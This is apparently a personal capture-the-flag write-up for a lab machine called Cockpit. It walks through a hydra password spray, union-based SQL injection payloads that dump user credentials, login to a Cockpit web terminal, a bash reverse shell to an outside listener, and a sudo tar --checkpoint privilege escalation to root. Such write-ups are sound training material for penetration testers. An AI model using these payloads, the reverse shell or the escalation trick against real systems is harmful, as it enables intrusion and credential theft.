# Cockpit - 192.168.205.10
## TLDR
1. Two web servers running, port 80 & 9090
2. Port 80 has SQLi, which we abused to get login credentials for admin
3. We now can login to the portal on port 80.
4. Here we find more credentials, Base64 encoded
5. These credentials, james user, allow for login to the portal on port 9090.
6. Here we find a terminal that we can interact wtih the system with
7. Get revShell
8. sudo -l shows we can use tar as root
9. GTFObin, tar --checkpoint option, with spaces in filenames to get root and flag.

## Open Ports
```
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)

9090/tcp open  http    syn-ack ttl 61 Cockpit web service 198 - 220

```
## TCP 80
- We have a login page at `http://192.168.205.10/login.php/`
	- default credentials didn't allow login, sending to burp
	- Invalid password!
	- by JDgodd | blaze.offsec
- maybe blaze.offsec is a virtual host?
- Inserting single apostrophe, thorws a SQL error

## Password Spray
```bash
# wwwuseres.txt has admin, administrator, blaze, .. should have added JDgodd
hydra -L ./wwwusers.txt -P /usr/share/wordlists/rockyou.txt 192.168.205.10 http-post-form "/login.php:username=^user^&password=^PASS^:Invalid password"

[80][http-post-form] host: 192.168.205.10   login: admin   password: sleepy

``` 
- Success!  Found valid creds: `admin:sleepy`
- Wasn't able to login though, the login is 'blocked'
## SQLi testing
1. Create error
2. find number of columns
3. Find which columns are visible
4. List Current DB
5. Query Schema for DB, table, column names
6. Exfil Data from columns using group_concat

### 1. Create error
- single `'` in username field throws SQL error.
- Sending to repeater in burp
- ```bash
    username=admin%27&password=pass
  ```
  - If you look at the POST request, you'll see our single quote/apostrophe, got ENCODED
  - That MEANS, we might have to  ENCODE certain characters requests, to get them to work as well.
  - Burp, use our order by syntax but URL encode it
  ### 2. Find Number of Columns
  - this syntax seems to work however `' ORDER BY 10-- `  
- HackTrack With mentors mentiosn using `'+ORDER+BY+10--+` 
```sql
POST /login.php/login.php HTTP/1.1
Host: 192.168.205.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

  username='+ORDER+BY+5--+
``` 
##### Number Columns = 5
### 3. Find which columns are visible
- Issue the command, in burp, or browser
- Easiest to see if you look at the RENDERED page, 
-  Find the text corresponding to your visible columns
```
'+union+select+'A1','B2','C3','D4','D5'--+-
<<< B2 is Visible >>>
```
### 4. List Current DB
```
username='+union+select+'A1',database(),'C3','D4','D5'--+-
<<<  DB = BlazeDB >>>
```

### 5.  Query Schema for DB, Table, Column Names 

```
# List all tables inside current database
username='+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables--+

# Define WHERE clause to narrow search
username='+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+
<<<   Table_name = users >>> 

# Query for table column names from Schema
username='+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+
<<<   Interesting columns   >>> 
```
### 6. Exfil Data From Columns Using group_concat
```
# Exfiltrate data from columns
'+union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+users--+-
<<< james@@admin@@canttouchhhthiss@455152 >>>
name = james
username = admin
password = canttouchhhthiss@455152

```

We now can login to the portal
On the portal, we find 2 encrypted words/passwords, Base64 encoded

james : Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= : canttouchhhthiss@455152
cameron : dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy : thisscanttbetouchedd@455152
JDgodd


## SSH
192.168.205.10
ssh  admin@192.168.205.10 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -p 22

SSH doesn't work

with NEW credentials, we are able to login on that login page we saw open at the start, 9090
https://192.168.205.10:9090/system/terminal
With username james : canttouchhhthiss@455152
There is a terminal we can get on the box with!

Downloaded linpeas.sh

## RevShell
- seemed to be some limits with the terminal we were in, used  revshell instead
`/bin/sh -i >& /dev/tcp/192.168.45.190/4444 0>&1`

 `sudo -l` command shows that user **james** can run the following command as root **without a password**: 
- tar has options  which will stop it during processing, allowing for command execution
- we trick ta  by passing these options, with special characters, so they look like files, but  processed like options 
```
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "/bin/bash" > payload.sh  
chmod +x payload.sh 
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
whoami, root
flag is at /root
